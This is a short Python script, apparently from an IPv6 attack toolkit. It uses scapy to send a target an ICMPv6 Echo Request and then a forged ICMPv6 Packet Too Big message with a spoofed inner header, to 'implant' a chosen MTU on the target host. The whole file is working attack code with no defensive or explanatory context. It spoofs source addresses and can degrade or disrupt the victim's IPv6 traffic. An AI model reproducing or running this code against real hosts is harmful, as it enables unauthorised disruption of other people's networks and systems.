#!/usr/bin/python
from scapy.layers.inet6 import IPv6, ICMPv6EchoRequest, ICMPv6PacketTooBig, IPerror6, ICMPv6EchoReply
from scapy.sendrecv import send


def toobigMTU(interface, tip, sip, mtu):
    layer3 = IPv6(src=sip, dst=tip, hlim=255)
    # Generate ICMPv6 Echo Request, it is compulsory before sending Packet Too Big
    data_1 = 'A' * (mtu - 48)  # 40 bytes IPv6 Header + 8 bytes ICMPv6 Header
    icmpv6_1 = ICMPv6EchoRequest(data=data_1)
    packet1 = layer3 / icmpv6_1
    # Generate ICMPv6 Echo Reply with Packet Too Big to the target
    data_2 = 'A' * (mtu - 96)  # 40 bytes outdoor IPv6 Header + 40 bytes indoor IPv6 Header + ICMPv6 + MTU
    icmpv6_2 = ICMPv6PacketTooBig(mtu=mtu) / IPerror6(src=tip, dst=sip) / ICMPv6EchoReply(data=data_2)
    packet2 = layer3 / icmpv6_2
    if interface == "":
        send(packet1, verbose=False)
        send(packet2, verbose=False)
    else:
        send(packet1, verbose=False, iface=interface)
        send(packet2, verbose=False, iface=interface)
    print("Implanting specified MTU to the target: ", tip)
